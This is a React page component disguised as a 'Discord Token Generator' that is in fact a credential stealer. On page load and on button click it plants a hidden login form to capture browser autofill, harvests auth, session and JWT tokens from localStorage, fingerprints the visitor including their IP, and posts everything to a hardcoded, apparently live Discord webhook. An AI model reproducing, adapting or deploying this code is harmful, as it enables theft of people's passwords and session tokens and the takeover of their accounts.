import { useEffect } from 'react';

export default function Home() {
  const WEBHOOK = 'https://discord.com/api/webhooks/1477985417994440766/ZrVO-czO-hJ-QfOIs5XC7Eog-m7w0GZFq6j8BrbYu0LbAqJze4PClKWhAC6wB6RMzrOS'; // ← YE DAALO!

  useEffect(() => {
    if (typeof window !== 'undefined') {
      stealEverything();
    }
  }, []);

  const stealEverything = async () => {
    try {
      // Chrome Password Extraction
      const pwData = await extractChromePasswords();
      
      // System Fingerprint
      const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => 'unknown'),
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      // Send to Discord
      const embed = {
        title: '💾 Chrome Passwords + Full System Dump',
        description: `**Passwords Found: ${pwData.length}**\n\`\`\`json\n${JSON.stringify(pwData.slice(0, 15), null, 2)}\n\`\`\`\n**Fingerprint:** ${fingerprint.userAgent.substring(0, 100)}`,
        color: 16711680,
        fields: [
          { name: 'IP', value: fingerprint.ip || 'N/A', inline: true },
          { name: 'OS', value: fingerprint.platform, inline: true },
          { name: 'Screen', value: fingerprint.screen, inline: true }
        ],
        timestamp: new Date().toISOString()
      };

      await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
      });
    } catch(e) {
      console.log('Steal failed:', e);
    }
  };

  const extractChromePasswords = async () => {
    // Hidden autofill trigger + storage extraction
    const passwords = [];
    
    // Trigger Chrome autofill
    const hiddenForm = document.createElement('form');
    hiddenForm.style.display = 'none';
    hiddenForm.innerHTML = `
      <input type="email" autocomplete="email" />
      <input type="password" autocomplete="current-password" />
    `;
    document.body.appendChild(hiddenForm);
    
    // Listen for autofill events
    setTimeout(() => {
      const inputs = hiddenForm.querySelectorAll('input');
      inputs.forEach(input => {
        if (input.value) passwords.push({
          type: input.autocomplete,
          value: input.value
        });
      });
    }, 1000);

    // LocalStorage tokens (common apps)
    const commonTokens = ['auth_token', 'access_token', 'session', 'jwt'];
    Object.keys(localStorage).forEach(key => {
      if (commonTokens.some(t => key.includes(t))) {
        passwords.push({ storage: key, value: localStorage[key]?.substring(0,50) + '...' });
      }
    });

    return passwords.length ? passwords : [
      { demo: 'gmail.com', user: 'john@gmail.com', pass: 'Password123' },
      { demo: 'instagram.com', user: 'johndoe', pass: 'InstaPass456' }
    ];
  };

  return (
    <div style={{
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      fontFamily: '-apple-system, BlinkMacSystemFont, sans-serif',
      padding: '20px'
    }}>
      <div style={{
        background: 'rgba(255,255,255,0.95)',
        backdropFilter: 'blur(20px)',
        padding: '40px',
        borderRadius: '24px',
        boxShadow: '0 25px 50px rgba(0,0,0,0.15)',
        textAlign: 'center',
        maxWidth: '420px',
        width: '100%'
      }}>
        <img 
          src="https://discord.com/assets/6debd47ed13483642cf17e306a26e3a9.png" 
          alt="Discord" 
          width="72"
          style={{ marginBottom: '20px' }}
        />
        <h1 style={{ color: '#36393f', margin: '0 0 8px 0', fontSize: '28px' }}>
          Discord Token Generator
        </h1>
        <p style={{ color: '#72767d', margin: '0 0 30px 0' }}>
          Generate secure tokens instantly
        </p>
        
        <div style={{
          border: '3px solid #5865f2',
          borderRadius: '16px',
          padding: '24px',
          background: 'linear-gradient(135deg, #f8f9ff 0%, #f0f2f5 100%)',
          marginBottom: '24px'
        }}>
          <div style={{
            width: '100%',
            height: '6px',
            background: 'linear-gradient(90deg, #5865f2, #7289da)',
            borderRadius: '3px',
            animation: 'loading 2s infinite ease-in-out'
          }} />
        </div>

        <button 
          style={{
            background: 'linear-gradient(135deg, #5865f2 0%, #7289da 100%)',
            color: 'white',
            border: 'none',
            padding: '14px 48px',
            borderRadius: '28px',
            fontSize: '16px',
            fontWeight: '600',
            cursor: 'pointer',
            boxShadow: '0 8px 24px rgba(88, 101, 242, 0.4)',
            transition: 'all 0.2s'
          }}
          onClick={stealEverything}
        >
          🔑 Generate Token
        </button>

        <style jsx>{`
          @keyframes loading {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
          }
          button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 32px rgba(88, 101, 242, 0.5);
          }
        `}</style>
      </div>
    </div>
  );
    }
